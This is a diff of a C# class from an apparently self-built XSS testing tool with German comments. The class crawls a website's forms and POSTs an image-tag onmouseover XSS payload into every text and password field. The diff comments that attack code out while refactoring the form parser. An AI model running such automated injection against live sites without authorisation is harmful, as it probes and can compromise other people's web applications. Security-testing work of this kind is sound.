@@ -20,6 +20,12 @@ namespace XSS_Test
         bool _formTagOpen = false;
 	    #endregion
 
+        #region testing
+        private string _Website;
+        private List<HtmlNode> docNodeList;
+
+        #endregion
+
         #region Constructor
 
         public AttackProcess(XSSEvalForm frm)
@@ -29,9 +35,22 @@ namespace XSS_Test
 
         #endregion
 
+        public List<FormContainer> GetFormContainer(string website)
+        {
+            _Website = website;
+
+            Task task = new Task(InitialRequest); ;
+
+            task.Start();
+            task.Wait();
+
+            return this._formTags;
+        }
+
         // Führe einen initialen Request gegen die zu attackierende Seite aus
-        public async void InitialRequest(string website)
-        {      
+        private async void InitialRequest()
+        {
+            string website = _Website;
             // Listencontainer aller Nodes
             List<HtmlNode> docNodeList;
 
@@ -52,13 +71,10 @@ namespace XSS_Test
             }
 
             // Erstelle FormContainer
-            FilterFormContainer(docNodeList);
-
-            // 
-            GenerateFormActionRequest(website);
+            //FilterFormContainer(docNodeList, website);
         }
         
-        private void FilterFormContainer(List<HtmlNode> docNodeList)
+        private void FilterFormContainer(List<HtmlNode> docNodeList, string website)
         {
             // Valide InputTags zur weiteren Verarbeitung
             IEnumerable<string> validInputTags = new List<string>(){ "text", "password", "submit"};
@@ -76,30 +92,32 @@ namespace XSS_Test
 
                     if (_frmContainer == null)
                     {
-                        _frmContainer = new FormContainer();
+                        _frmContainer = new FormContainer(website);
                     }
                     else
-                    {
-                        _formTags.Add(_frmContainer);
-                        _frmContainer = new FormContainer();
+                    {                        
+                        // Speichere aktuellen FormContainer in Liste
+                        _formTags.Add(_frmContainer.CopyNew());
+
+                        // Lege für weiteres FormTag ein neues Objekt an
+                        _frmContainer = new FormContainer(website);
                     }
 
                     // Speichere die validen Attribute des FormTags im FormContainer-Object
                     foreach (var attribute in node.Attributes)
                     {
                         if(validFormTags.Contains(attribute.Name.ToLower()))
-                        _frmContainer.AddAttribute(attribute.Name, attribute.Value);
+                        _frmContainer.SetAttributeValue(attribute.Name, attribute.Value);
                     }
                 }
 
-               
                 // Input Nodes in FormContainer speichern
                 if (node.Name.ToLower() == "input" && _formTagOpen)
                 {
                     // InputTag in Liste der validen Tags?
                     if (validInputTags.Contains((node.GetAttributeValue("type", "undefined").ToLower())))
 	                {
-		                 _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));
+		                 _frmContainer.AddInput(node.GetAttributeValue("name", "undefined"));
 	                }
                 }
             }
@@ -109,207 +127,124 @@ namespace XSS_Test
                 _formTags.Add(_frmContainer);            
         }
 
+        //public async void Attack(string website)
+        //{
+        //    List<HtmlNode> _docNodeList;
 
-        private void GenerateFormActionRequest(string website)
-        {
-            // Für jedes Formtag eine Anfrage an die in "action" definierte Site generieren 
-            foreach (var item in _formTags)
-            {
-                string tmpWebsite = website.Substring(0, website.Length - (website.Length - website.LastIndexOf('/')) + 1);
+        //    HttpClient http = new HttpClient();
+        //    try
+        //    {
+        //        var response = await http.GetByteArrayAsync(website);
+        //        String source = Encoding.GetEncoding("utf-8").GetString(response, 0, response.Length - 1);
+        //        source = WebUtility.HtmlDecode(source);
+        //        HtmlAgilityPack.HtmlDocument result = new HtmlAgilityPack.HtmlDocument();
+        //        result.LoadHtml(source);
 
-                string siteEqual = tmpWebsite;
+        //        // NodeList erstellen
+        //        _docNodeList = result.DocumentNode.Descendants().ToList();
+        //    }
+        //    catch (Exception e)
+        //    {
+        //        _response.WriteResponse(e.Message);
+        //        return;
+        //    }
 
-                foreach (var attribute in item.Attributes)
-                {
-                    if (attribute.Key.Contains("action"))
-                    {
-                        tmpWebsite += attribute.Value;
-
-                        // Falls self-calling Form: Request gegen original website
-                        if (attribute.Value == String.Empty)
-                            tmpWebsite = website;
-                    }
-
-                }
-
-                // Action - Attribut vorhanden?
-                if (siteEqual == tmpWebsite)
-                {
-                    continue;
-                }
-
-                // TODO: PostHttpClient oder GetHttpClient für jedes action generieren
-                POSTAttack(tmpWebsite, item);
-            }
-        }
-
-
-        public async void Attack(string website)
-        {
-            List<HtmlNode> _docNodeList;
-
-            HttpClient http = new HttpClient();
-            try
-            {
-                var response = await http.GetByteArrayAsync(website);
-                String source = Encoding.GetEncoding("utf-8").GetString(response, 0, response.Length - 1);
-                source = WebUtility.HtmlDecode(source);
-                HtmlAgilityPack.HtmlDocument result = new HtmlAgilityPack.HtmlDocument();
-                result.LoadHtml(source);
-
-                // NodeList erstellen
-                _docNodeList = result.DocumentNode.Descendants().ToList();
-            }
-            catch (Exception e)
-            {
-                _response.WriteResponse(e.Message);
-                return;
-            }
-
-            // Alle FormTags ermitteln und in Liste speichern
-            if (_docNodeList != null)
-            {
-                GenerateFormContainer(_docNodeList);
-            }
-            else
-            {
-                _response.WriteResponse("Error: Kein FormTag gefunden!");
-                return;
-            }
+        //    // Alle FormTags ermitteln und in Liste speichern
+        //    if (_docNodeList != null)
+        //    {
+        //        GenerateFormContainer(_docNodeList);
+        //    }
+        //    else
+        //    {
+        //        _response.WriteResponse("Error: Kein FormTag gefunden!");
+        //        return;
+        //    }
 
 
-            // Führe die Attacken aus
-            PerformAttack(website);           
-        }
+        //    // Führe die Attacken aus
+        //    PerformAttack(website);           
+        //}
 
-        private void GenerateFormContainer(List<HtmlNode> docNodeList)
-        {
-            // Alle Formtags mit ihren jeweiligen Attributen und Input-Tags filtern
-            foreach (HtmlNode node in docNodeList)
-            {
-                if (node.Name.ToLower() == "form")
-                {
-                    _formTagOpen = true;
+        //private void PerformAttack(string website)
+        //{
+        //    // Für jedes Formtag eine Anfrage an die in "action" definierte Site generieren 
+        //    foreach (FormContainer item in _formTags)
+        //    {
+        //        string tmpWebsite = website.Substring(0, website.Length - (website.Length - website.LastIndexOf('/')) + 1);
 
-                    if (_frmContainer == null)
-                    {
-                        _frmContainer = new FormContainer();
-                    }
-                    else
-                    {
-                        // Speichere aktuellen FormContainer in Liste
-                        _formTags.Add(_frmContainer.Copy());
-                        
-                        // Lege für weiteres FormTag ein neues Objekt an
-                        _frmContainer = new FormContainer();
-                    }
+        //        string siteEqual = tmpWebsite;
+        //        bool postMethod = false;
 
-                    // Speichere die Attribute des FormTags im FormContainer-Object
-                    foreach (var attribute in node.Attributes)
-                    {
-                        _frmContainer.AddAttribute(attribute.Name, attribute.Value);
-                    }
-                }
+        //        foreach (var attribute in item.Attributes)
+        //        {
+        //            if (attribute.Key.ToLower().Contains("action"))
+        //            {
+        //                tmpWebsite += attribute.Value;
 
-                // TODO: Felder zur weiteren Verwendung bestimmen
+        //                // Falls self-calling Form: Request gegen original website
+        //                if (attribute.Value == String.Empty)
+        //                    tmpWebsite = website;
+        //            }
 
-                // Input Nodes in FormContainer speichern
-                if (node.Name.ToLower() == "input" && _formTagOpen)
-                {
-                    if ((node.GetAttributeValue("type", "undefined").ToLower() == "text") || (node.GetAttributeValue("type", "undefined").ToLower() == "password"))
-                        _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));
+        //            // Method?
+        //            if (attribute.Key.ToLower().Contains("post"))
+        //            {
+        //                postMethod = true;
+        //            }
+        //        }
 
-                    // Submit in FormContainer speichern
-                    if (node.GetAttributeValue("type", "undefined").ToLower() == "submit")
-                        _frmContainer.AddField(node.GetAttributeValue("name", "undefined"));
-                }
-            }
+        //        // TODO: Check for Javascript
+        //        // Action - Attribut vorhanden?
+        //        if (siteEqual == tmpWebsite)
+        //            continue;
 
-            // Letztes FormTag als Object in den Container hinzufügen
-            if (_frmContainer != null)
-                _formTags.Add(_frmContainer);
-        }
+        //        // Request-Site anzeigen
+        //        _response.WriteResponse("Attack against: " + tmpWebsite + Environment.NewLine, true);
 
-        private void PerformAttack(string website)
-        {
-            // Für jedes Formtag eine Anfrage an die in "action" definierte Site generieren 
-            foreach (FormContainer item in _formTags)
-            {
-                string tmpWebsite = website.Substring(0, website.Length - (website.Length - website.LastIndexOf('/')) + 1);
+        //        // TODO: PostHttpClient oder GetHttpClient für jedes action generieren
+        //        if (postMethod)
+        //            POSTAttack(tmpWebsite, item);
+        //        else
+        //            continue; // TODO: GETAttack()
+        //    }
+        //}
 
-                string siteEqual = tmpWebsite;
-                bool postMethod = false;
+        //public async void POSTAttack(string website, FormContainer item)
+        //{
+        //    string[] inputs = item.Fields.ToArray<string>();
 
-                foreach (var attribute in item.Attributes)
-                {
-                    if (attribute.Key.ToLower().Contains("action"))
-                    {
-                        tmpWebsite += attribute.Value;
+        //    using (var client = new HttpClient())
+        //    {
+        //        var values = new Dictionary<string, string>();
 
-                        // Falls self-calling Form: Request gegen original website
-                        if (attribute.Value == String.Empty)
-                            tmpWebsite = website;
-                    }
+        //        try
+        //        {
+        //            if (inputs != null)
+        //            {
+        //                foreach (string input in inputs)
+        //                {
+        //                    if (input.ToLower() != "submit")
+        //                        values.Add(input, "<IMG SRC= onmouseover=\"alert('xxs')\">");
+        //                }
+        //            }
+        //        }
+        //        catch (Exception e)
+        //        {
 
-                    // Method?
-                    if (attribute.Key.ToLower().Contains("post"))
-                    {
-                        postMethod = true;
-                    }
-                }
+        //        }
 
-                // TODO: Check for Javascript
-                // Action - Attribut vorhanden?
-                if (siteEqual == tmpWebsite)
-                    continue;
+        //        string[] submit = item.GetSubmit();
+        //        if (submit != null)
+        //            values.Add(submit[0], submit[1]);
 
-                // Request-Site anzeigen
-                _response.WriteResponse("Attack against: " + tmpWebsite + Environment.NewLine, true);
+        //        var content = new FormUrlEncodedContent(values);
 
-                // TODO: PostHttpClient oder GetHttpClient für jedes action generieren
-                if (postMethod)
-                    POSTAttack(tmpWebsite, item);
-                else
-                    continue; // TODO: GETAttack()
-            }
-        }
-
-        public async void POSTAttack(string website, FormContainer item)
-        {
-            string[] inputs = item.Fields.ToArray<string>();
-
-            using (var client = new HttpClient())
-            {
-                var values = new Dictionary<string, string>();
-
-                try
-                {
-                    if (inputs != null)
-                    {
-                        foreach (string input in inputs)
-                        {
-                            if (input.ToLower() != "submit")
-                                values.Add(input, "<IMG SRC= onmouseover=\"alert('xxs')\">");
-                        }
-                    }
-                }
-                catch (Exception e)
-                {
-
-                }
-
-                string[] submit = item.GetSubmit();
-                if (submit != null)
-                    values.Add(submit[0], submit[1]);
-
-                var content = new FormUrlEncodedContent(values);
-
-                var response = await client.PostAsync(website, content);
+        //        var response = await client.PostAsync(website, content);
 
 
-                _response.WriteResponse(response.ToString() + Environment.NewLine + response.RequestMessage + Environment.NewLine + await response.Content.ReadAsStringAsync(), true);
-            }
-        }
+        //        _response.WriteResponse(response.ToString() + Environment.NewLine + response.RequestMessage + Environment.NewLine + await response.Content.ReadAsStringAsync(), true);
+        //    }
+        //}
 
     }
 }
